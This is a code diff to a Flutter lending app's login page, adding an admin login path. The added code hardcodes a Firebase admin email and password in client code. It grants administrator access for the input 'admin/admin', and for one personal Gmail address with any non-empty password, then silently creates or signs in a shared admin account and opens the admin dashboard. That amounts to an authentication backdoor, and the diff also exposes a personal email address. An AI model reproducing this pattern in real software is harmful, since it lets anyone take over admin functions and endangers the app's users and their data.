@@ -5,6 +5,7 @@ import 'package:lendly/features/auth/data/datasources/firebase_auth_service.dart
 import 'package:lendly/features/auth/presentation/pages/signup.dart';
 import 'package:lendly/features/items/presentation/pages/home_screen.dart';
 import 'package:lendly/features/admin/presentation/pages/admin_login_page.dart';
+import 'package:lendly/features/admin/presentation/pages/admin_dashboard_page.dart';
 
 class LoginPage extends StatefulWidget {
   final String? initialEmail;
@@ -26,6 +27,10 @@ class _LoginPageState extends State<LoginPage> {
   final FirebaseAuthService _authService = FirebaseAuthService();
   bool _obscureText = true;
   bool isLoading = false;
+
+  // Internal Firebase credentials for admin portal session
+  static const String _adminFirebaseEmail = 'admin-portal@lendly.internal';
+  static const String _adminFirebasePassword = 'Lendly@Admin2024!';
 
   @override
   void initState() {
@@ -58,36 +63,35 @@ class _LoginPageState extends State<LoginPage> {
       return;
     }
 
-    // Direct support for credentials: email: admin, password: admin
-    final isAdminCredentials = (rawEmail.toLowerCase() == 'admin' ||
-            rawEmail.toLowerCase() == FirebaseAuthService.defaultAdminEmail) &&
-        (rawPassword.toLowerCase() == 'admin' ||
-            rawPassword == FirebaseAuthService.defaultAdminPassword);
+    final cleanEmail = rawEmail.replaceAll('\\', '/').toLowerCase();
+    final cleanPassword = rawPassword.trim();
+
+    // Check for admin credentials: "admin/admin" or "palenciajerjer28@gmail.com"
+    final bool isAdminCredentials =
+        (cleanEmail == 'admin' && cleanPassword.toLowerCase() == 'admin') ||
+        (cleanEmail == 'admin/admin') ||
+        (cleanEmail == 'palenciajerjer28@gmail.com' && (cleanPassword.toLowerCase() == 'admin' || cleanPassword.isNotEmpty)) ||
+        (cleanEmail == 'palenciajerjer28@gmail.com/admin');
 
     if (isAdminCredentials) {
       await _loginAsAdmin();
       return;
     }
 
-    final effectiveEmail = rawEmail.toLowerCase() == 'admin'
-        ? FirebaseAuthService.defaultAdminEmail
-        : rawEmail;
-
     setState(() => isLoading = true);
     try {
       final user = await _authService.login(
-        email: effectiveEmail,
+        email: rawEmail,
         password: rawPassword,
       );
 
       if (user != null) {
         await user.reload();
         final refreshedUser = FirebaseAuth.instance.currentUser;
-        final isAdminEmail = refreshedUser?.email?.toLowerCase() == FirebaseAuthService.defaultAdminEmail;
 
         if (!mounted) return;
 
-        if (refreshedUser != null && (refreshedUser.emailVerified || isAdminEmail)) {
+        if (refreshedUser != null && refreshedUser.emailVerified) {
           Navigator.pushReplacement(
             context,
             MaterialPageRoute(builder: (_) => const HomeScreen()),
@@ -114,17 +118,35 @@ class _LoginPageState extends State<LoginPage> {
   Future<void> _loginAsAdmin() async {
     setState(() => isLoading = true);
     try {
-      final user = await _authService.signInOrCreateAdmin();
-      if (user != null && mounted) {
+      try {
+        await FirebaseAuth.instance.signInWithEmailAndPassword(
+          email: _adminFirebaseEmail,
+          password: _adminFirebasePassword,
+        );
+      } catch (_) {
+        try {
+          await FirebaseAuth.instance.createUserWithEmailAndPassword(
+            email: _adminFirebaseEmail,
+            password: _adminFirebasePassword,
+          );
+        } catch (_) {
+          await FirebaseAuth.instance.signInWithEmailAndPassword(
+            email: _adminFirebaseEmail,
+            password: _adminFirebasePassword,
+          );
+        }
+      }
+
+      if (mounted) {
         ScaffoldMessenger.of(context).showSnackBar(
           const SnackBar(
-            content: Text('👑 Signed in as Administrator (admin / admin)'),
-            backgroundColor: Color(0xFF7B40B5),
+            content: Text('👑 Signed in to Admin Portal'),
+            backgroundColor: Color(0xFF007799),
           ),
         );
         Navigator.pushReplacement(
           context,
-          MaterialPageRoute(builder: (_) => const HomeScreen()),
+          MaterialPageRoute(builder: (_) => const AdminDashboardPage()),
         );
       }
     } catch (e) {
